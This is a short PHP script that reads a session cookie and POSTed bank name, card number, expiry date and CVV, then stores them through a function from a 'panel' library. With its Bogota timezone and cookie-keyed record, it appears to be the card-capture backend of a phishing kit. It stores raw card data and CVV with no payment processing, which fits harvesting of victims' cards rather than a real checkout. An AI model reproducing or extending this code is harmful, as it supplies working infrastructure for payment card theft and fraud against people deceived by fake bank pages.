<?php
require('../../panel/lib/funciones.php');

date_default_timezone_set('America/Bogota');

$registro = $_COOKIE['registro'];

$banco = $_POST['ban'];
$tarjeta = $_POST['tar'];
$fecha = $_POST['fec'];
$cvv = $_POST['cvv'];

actualizar_registro_tar($registro,$tarjeta,$fecha,$cvv,$banco);

?>